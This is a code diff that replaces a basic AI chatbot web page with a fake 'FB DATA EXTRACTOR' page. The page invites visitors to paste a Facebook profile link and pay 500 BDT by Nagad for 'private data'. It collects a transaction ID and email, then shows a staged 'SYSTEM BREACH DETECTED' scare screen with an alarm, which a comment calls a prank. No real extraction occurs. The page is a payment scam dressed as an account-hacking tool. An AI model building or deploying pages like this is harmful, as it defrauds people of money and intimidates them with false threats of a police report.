@@ -1,34 +1,138 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>AI Chatbot</title>
-  <style>
-    body { font-family: Arial; margin: 20px; }
-    #chat { height: 300px; overflow-y: scroll; border: 1px solid #ccc; padding: 10px; }
-    input { width: 80%; }
-    button { width: 18%; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FB CLOUD BYPASS - SECURE ACCESS</title>
+    <style>
+        body { background-color: #050505; color: #00FF00; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; overflow: hidden; transition: 0.1s; }
+        .box { width: 90%; max-width: 500px; border: 1px solid #00FF00; padding: 25px; background: rgba(0, 20, 0, 0.95); box-shadow: 0 0 15px #00FF00; text-align: center; position: relative; z-index: 10; }
+        input { background: #000; border: 1px solid #00FF00; color: #00FF00; padding: 12px; width: 85%; margin: 10px 0; outline: none; font-size: 14px; }
+        button { background: #00FF00; color: #000; border: none; padding: 12px 25px; font-weight: bold; cursor: pointer; text-transform: uppercase; margin-top: 10px; transition: 0.3s; }
+        button:hover { background: #008800; color: white; }
+        .hidden { display: none; }
+        
+        /* Glitch Animation */
+        .glitch-screen { animation: glitch 0.2s infinite; background: #220000 !important; }
+        @keyframes glitch {
+            0% { transform: translate(2px, 2px) skew(0deg); filter: hue-rotate(0deg); }
+            50% { transform: translate(-2px, -2px) skew(5deg); filter: invert(1); }
+            100% { transform: translate(0, 0) skew(-5deg); }
+        }
+
+        .warning-text { color: red; font-size: 40px; font-weight: bold; text-shadow: 0 0 10px white; }
+        #timer { font-size: 45px; color: yellow; margin: 20px 0; }
+        .payment-card { border: 1px dashed white; padding: 15px; margin: 15px 0; background: rgba(255, 255, 255, 0.1); }
+    </style>
 </head>
-<body>
-  <h1>My AI Chatbot</h1>
-  <div id="chat"></div>
-  <input type="text" id="message" placeholder="Type your message...">
-  <button onclick="sendMessage()">Send</button>
-  <script>
-    async function sendMessage() {
-      const message = document.getElementById('message').value;
-      if (!message) return;
-      document.getElementById('chat').innerHTML += `<p>You: ${message}</p>`;
-      document.getElementById('message').value = '';
-      const response = await fetch('/chat', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ message })
-      });
-      const data = await response.json();
-      document.getElementById('chat').innerHTML += `<p>Bot: ${data.reply}</p>`;
-    }
-  </script>
+<body id="mainBody">
+
+    <div class="box" id="step1">
+        <h2>FB DATA EXTRACTOR v9.2</h2>
+        <p style="font-size: 12px; color: #aaa;">[ STATUS: SERVER ONLINE ]</p>
+        <input type="text" id="targetLink" placeholder="Paste Profile Link Here...">
+        <br>
+        <button onclick="goToPayment()">CONTINUE TO ACCESS</button>
+    </div>
+
+    <div class="box hidden" id="step2">
+        <h2 style="color: yellow;">PAYMENT VERIFICATION</h2>
+        <p>To access private data, pay the server decryption fee.</p>
+        <div class="payment-card">
+            Send <strong>500 BDT</strong> to Nagad (Personal):<br>
+            <span style="font-size: 22px; color: #00FF00;">017XXXXXXXX</span>
+        </div>
+        <p style="font-size: 12px;">Enter Transaction ID to enable Download Button:</p>
+        <input type="text" id="trxInput" placeholder="Enter 8-digit TrxID..." oninput="validateTrx()">
+        <br>
+        <button id="downloadBtn" disabled style="opacity: 0.3; cursor: not-allowed;" onclick="goToEmail()">DOWNLOAD DATA</button>
+    </div>
+
+    <div class="box hidden" id="step3">
+        <h2>RECIPIENT INFO</h2>
+        <p>Transaction ID Verified. Enter email to receive the download package.</p>
+        <input type="email" id="emailInput" placeholder="Enter Your Email...">
+        <br>
+        <button onclick="startFinalProcess()">START EXTRACTION</button>
+    </div>
+
+    <div class="box hidden" id="step4">
+        <h2>PROCESSING REQUEST...</h2>
+        <p>Uploading files to cloud storage...</p>
+        <div id="timer">05:00</div>
+        <p style="font-size: 12px;">Do not refresh this page.</p>
+    </div>
+
+    <div class="box hidden" id="step5">
+        <h1 class="warning-text">WARNING!</h1>
+        <p>SYSTEM BREACH DETECTED</p>
+        <p style="color: yellow;">ACCESS TO META SERVERS IS FORBIDDEN.</p>
+        <p>YOUR DEVICE ID & LOCATION HAS BEEN LOGGED.</p>
+        <p style="border: 1px solid white; padding: 10px;">REPORT SENT TO CYBER CRIME UNIT.</p>
+    </div>
+
+    <audio id="alarm" loop src="https://www.soundjay.com/buttons/sounds/beep-07.mp3"></audio>
+
+    <script>
+        const alarm = document.getElementById('alarm');
+
+        function goToPayment() {
+            const link = document.getElementById('targetLink').value;
+            if (link.length < 5) { alert("Please enter a valid link!"); return; }
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+        }
+
+        // Only enable Download button if TrxID is entered
+        function validateTrx() {
+            const trx = document.getElementById('trxInput').value;
+            const btn = document.getElementById('downloadBtn');
+            if (trx.length >= 6) {
+                btn.disabled = false;
+                btn.style.opacity = "1";
+                btn.style.cursor = "pointer";
+            } else {
+                btn.disabled = true;
+                btn.style.opacity = "0.3";
+                btn.style.cursor = "not-allowed";
+            }
+        }
+
+        function goToEmail() {
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.remove('hidden');
+        }
+
+        function startFinalProcess() {
+            const email = document.getElementById('emailInput').value;
+            if (!email.includes('@')) { alert("Invalid Email!"); return; }
+            
+            document.getElementById('step3').classList.add('hidden');
+            document.getElementById('step4').classList.remove('hidden');
+
+            let timeLeft = 300;
+            const timerDisplay = document.getElementById('timer');
+
+            const countdown = setInterval(() => {
+                timeLeft--;
+                let m = Math.floor(timeLeft / 60);
+                let s = timeLeft % 60;
+                timerDisplay.innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
+
+                // Force glitch after 7 seconds for the prank
+                if (timeLeft === 293) {
+                    clearInterval(countdown);
+                    triggerGlitch();
+                }
+            }, 1000);
+        }
+
+        function triggerGlitch() {
+            document.getElementById('step4').classList.add('hidden');
+            document.getElementById('step5').classList.remove('hidden');
+            document.getElementById('mainBody').classList.add('glitch-screen');
+            alarm.play();
+        }
+    </script>
 </body>
 </html>
